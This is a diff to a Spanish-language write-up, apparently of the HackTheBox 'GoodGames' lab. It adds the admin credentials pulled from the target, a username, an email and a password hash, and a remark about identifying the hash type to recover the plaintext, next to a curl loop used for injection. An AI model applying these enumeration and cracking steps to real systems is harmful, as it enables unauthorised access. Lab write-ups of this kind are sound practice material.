@@ -93,6 +93,11 @@ for i in $(seq 0 100); do echo "[+] Para el numero $i: $(curl -s -X POST http://
 ```
 
 Obtendremos las credenciales del usuario admin
+```ad-hint
+admin:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec
+```
+
+La contraseña esta crakeada asi que vamos a ver que tipo de hash es para verla en texto claro
 
 
 
